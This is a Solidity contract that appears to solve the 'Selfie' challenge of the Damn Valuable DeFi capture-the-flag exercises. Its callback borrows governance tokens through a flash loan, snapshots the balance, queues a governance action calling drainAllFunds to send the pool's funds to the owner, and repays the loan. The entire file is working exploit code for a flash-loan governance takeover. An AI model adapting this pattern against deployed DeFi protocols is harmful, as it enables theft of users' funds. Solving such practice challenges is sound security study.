pragma solidity ^0.8.0;

import "./DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "hardhat/console.sol";

contract Challenge6Attack {
    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    SelfiePool public pool;
    address public owner;

    constructor(address tokenaddress, address governanceaddress, address pooladdress, address _owner) public {
        token = DamnValuableTokenSnapshot(tokenaddress);
        governance = SimpleGovernance(governanceaddress);
        pool = SelfiePool(pooladdress);
        owner = _owner;
    }

    function receiveTokens(address _address, uint256 _amount) external {
        
        DamnValuableTokenSnapshot(_address).snapshot();

        governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", address(owner)),
            0
        );

        DamnValuableTokenSnapshot(_address).transfer(msg.sender, _amount);
    }

    function attack(uint256 _amount) external {
        pool.flashLoan(_amount);
    }
}